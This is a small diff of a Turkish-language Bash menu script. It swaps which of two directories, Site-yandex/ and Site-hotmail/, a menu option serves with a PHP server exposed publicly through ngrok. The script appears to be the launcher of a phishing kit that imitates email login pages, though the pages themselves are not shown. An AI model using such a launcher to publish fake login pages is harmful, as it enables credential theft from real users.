@@ -42,7 +42,7 @@ elif [[ $islem == 2 || $islem == 02 ]]; then
         echo ""
         echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
         sleep 4
-        cd Site-yandex/
+        cd Site-hotmail/
         php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 3 || $islem == 03 ]]; then
         read -p "Port Giriniz: " port
@@ -51,7 +51,7 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
         echo ""
         echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
         sleep 4
-        cd Site-hotmail/
+        cd Site-yandex/
         php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 0 || $islem == 00 ]]; then
 cd ..
